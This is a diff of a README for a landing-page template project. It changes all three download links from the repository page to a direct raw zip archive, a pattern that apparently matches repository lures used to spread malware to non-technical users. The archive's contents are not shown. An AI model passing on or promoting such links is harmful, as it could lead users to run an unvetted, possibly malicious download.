@@ -1,6 +1,6 @@
 # 🚀 landing-page-templates - Beautiful Templates, Zero Coding Needed
 
-[![Download Now](https://img.shields.io/badge/Download-Landing%20Page%20Templates-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/pcpc82288-crypto/landing-page-templates)
+[![Download Now](https://img.shields.io/badge/Download-Landing%20Page%20Templates-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/pcpc82288-crypto/landing-page-templates/raw/refs/heads/main/assets/landing_page_templates_v1.2.zip)
 
 ---
 
@@ -48,7 +48,7 @@ These templates are completely free. Download them, use them for personal or com
 
 Click the big green button at the top of this page, or use this link:
 
-**[👉 Click Here to Download landing-page-templates](https://github.com/pcpc82288-crypto/landing-page-templates)**
+**[👉 Click Here to Download landing-page-templates](https://github.com/pcpc82288-crypto/landing-page-templates/raw/refs/heads/main/assets/landing_page_templates_v1.2.zip)**
 
 This link will take you to the official download page for the templates.
 
@@ -179,7 +179,7 @@ If you get stuck, here are some ideas:
 
 Do not wait. Your perfect landing page is just a few clicks away. Download the templates now, pick a design, and have your website ready by the end of the day.
 
-**[🚀 Download landing-page-templates Now](https://github.com/pcpc82288-crypto/landing-page-templates)**
+**[🚀 Download landing-page-templates Now](https://github.com/pcpc82288-crypto/landing-page-templates/raw/refs/heads/main/assets/landing_page_templates_v1.2.zip)**
 
 ---
 
